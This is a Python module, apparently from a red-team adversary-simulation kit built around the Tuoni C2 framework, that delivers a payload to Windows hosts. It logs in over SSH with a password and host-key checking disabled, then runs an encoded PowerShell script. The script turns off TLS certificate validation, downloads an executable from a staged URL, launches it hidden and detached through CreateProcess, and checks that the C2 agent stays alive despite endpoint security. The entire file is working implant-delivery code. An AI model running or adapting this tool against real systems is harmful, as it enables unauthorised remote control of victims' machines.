"""Payload delivery over SSH — the Windows-target half of a foothold, nothing else."""
import base64
import subprocess
import time

from adsim.tuoni.common import TuoniScriptError

SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=10"]

WIN32_SPAWN_ERRORS = {
    2: "file not found — the download did not land",
    5: "access denied — check the exec identity's rights on TEMP",
    193: "not a valid Win32 application — the staged URL served a non-PE body "
         "(payload still building, or a SHELLCODE payload delivered as .exe)",
}


def ps_b64(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode("ascii")


def ssh_run(user: str, password: str, host: str, cmd: str, label: str = "") -> subprocess.CompletedProcess:
    tag = f" [{label}]" if label else ""
    print(f"[*] SSH {user}@{host}{tag}: {cmd[:100]}")
    result = subprocess.run(
        ["sshpass", "-p", password, "ssh"] + SSH_OPTS + ["-l", user, host, cmd],
        capture_output=True, text=True, timeout=90,
    )
    if result.stdout.strip():
        print(f"    out: {result.stdout.strip()[:300]}")
    stderr = result.stderr.strip()
    if stderr and "Warning:" not in stderr and "Permanently added" not in stderr:
        print(f"    err: {stderr[:300]}")
    return result


def build_powershell_script(payload_fname, staged_url):
    return f"""
Add-Type -TypeDefinition @"
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public static class CertTrust {{
    public static void Init() {{
        ServicePointManager.ServerCertificateValidationCallback +=
            delegate(object s, X509Certificate c, X509Chain ch, SslPolicyErrors e) {{ return true; }};
    }}
}}
"@
[CertTrust]::Init()
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$payload = Join-Path $env:TEMP '{payload_fname}'
$wc = New-Object System.Net.WebClient
$wc.DownloadFile('{staged_url}', $payload)

$len = (Get-Item $payload).Length
$hdr = [System.IO.File]::ReadAllBytes($payload)[0..1] -join ','
if ($len -lt 10000 -or $hdr -ne '77,90') {{
    Write-Output ('payload_bad size=' + $len + ' hdr=' + $hdr)
    exit 1
}}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class HeadlessSpawn {{
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFO {{
        public Int32 cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public Int32 dwX; public Int32 dwY; public Int32 dwXSize; public Int32 dwYSize;
        public Int32 dwXCountChars; public Int32 dwYCountChars; public Int32 dwFillAttribute;
        public Int32 dwFlags; public Int16 wShowWindow; public Int16 cbReserved2;
        public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
    }}
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {{
        public IntPtr hProcess; public IntPtr hThread; public Int32 dwProcessId; public Int32 dwThreadId;
    }}
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
}}
"@

$si = New-Object HeadlessSpawn+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][HeadlessSpawn+STARTUPINFO])
$si.dwFlags = 1                # STARTF_USESHOWWINDOW
$si.wShowWindow = 0            # SW_HIDE
$pi = New-Object HeadlessSpawn+PROCESS_INFORMATION
$flags = 0x01000000 -bor 0x08000000   # CREATE_BREAKAWAY_FROM_JOB | CREATE_NO_WINDOW
$ok = [HeadlessSpawn]::CreateProcess(
    $payload, $null,
    [IntPtr]::Zero, [IntPtr]::Zero, $false, $flags,
    [IntPtr]::Zero, [System.IO.Path]::GetDirectoryName($payload),
    [ref]$si, [ref]$pi)
if ($ok) {{
    Write-Output ('payload_launched pid=' + $pi.dwProcessId)
}} else {{
    $e = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Output ('payload_failed err=' + $e)
    exit 1
}}
"""


def deliver_and_execute(target_ip, exec_user, exec_pass, payload_fname, staged_url):
    print(f"\n[*] Delivering and executing payload as {exec_user}")
    script = build_powershell_script(payload_fname, staged_url)
    r = ssh_run(exec_user, exec_pass, target_ip,
                f"powershell.exe -EncodedCommand {ps_b64(script)}", "deliver+exec")
    out = r.stdout or ""

    if "payload_bad" in out:
        detail = out[out.index("payload_bad"):].split("\n")[0].strip()
        raise TuoniScriptError(
            f"Download is not a PE binary: {detail}\n"
            f"    The staged URL returned something else. Fetch it directly to see what:\n"
            f"    curl -sk '{staged_url}' | head -c 200")

    if "payload_failed" in out:
        tail = out[out.index("payload_failed"):].split("\n")[0].strip()
        code = int(tail.rsplit("=", 1)[-1]) if tail.rsplit("=", 1)[-1].isdigit() else 0
        raise TuoniScriptError(
            f"CreateProcess failed ({tail}): "
            f"{WIN32_SPAWN_ERRORS.get(code, 'unmapped Win32 error')}")

    if "payload_launched" not in out:
        raise TuoniScriptError(
            "No launch marker in the output — the SSH call itself failed "
            "(auth, connectivity, or powershell.exe missing). Output above.")

    pid = out[out.index("payload_launched"):].split("\n")[0].strip().rsplit("=", 1)[-1]
    return pid.strip()


def agent_process_alive(target_ip, exec_user, exec_pass, pid, settle=10):
    print(f"\n[*] Letting pid {pid} settle for {settle}s, then checking it is still there")
    time.sleep(settle)
    r = ssh_run(exec_user, exec_pass, target_ip,
                f"powershell.exe -Command \"if (Get-Process -Id {pid} "
                f"-ErrorAction SilentlyContinue) {{'agent_alive'}} else {{'agent_dead'}}\"",
                "liveness")
    alive = "agent_alive" in (r.stdout or "")
    print(f"[{'+' if alive else '!'}] pid {pid} {'still running' if alive else 'is gone'}")
    return alive


def tuoni_deliver(staged_url, target, exec_user, exec_pass, settle=10):
    # The staged URL ends in the payload id query value; it names the file on the target.
    payload_fname = f"tuoni_agent_p{staged_url.rsplit('=', 1)[-1]}.exe"
    print(f"[+] Staged URL : {staged_url}")
    print(f"[+] Target     : {target} as {exec_user}")
    print(f"[+] Payload    : {payload_fname}")

    pid = deliver_and_execute(target, exec_user, exec_pass, payload_fname, staged_url)
    alive = agent_process_alive(target, exec_user, exec_pass, pid, settle=settle)

    print(f"\n[+] Delivery complete — pid {pid} "
          f"({'alive' if alive else 'DEAD after spawn'}).")
    if not alive:
        print("    The process did not survive the session close. The breakaway spawn\n"
              "    is in place, so a dead process points at endpoint security on the\n"
              "    target (Defender), not at delivery. Re-check before retrying.")
    else:
        print("    Delivery only confirms the process is running, NOT that the agent\n"
              "    beaconed. Verify the callback over the Tuoni API (GET /agents/active)\n"
              "    before running discovery/lateral — and do NOT cleanup until the\n"
              "    callback is confirmed.")

    return {"pid": pid, "alive": alive, "staged_url": staged_url}
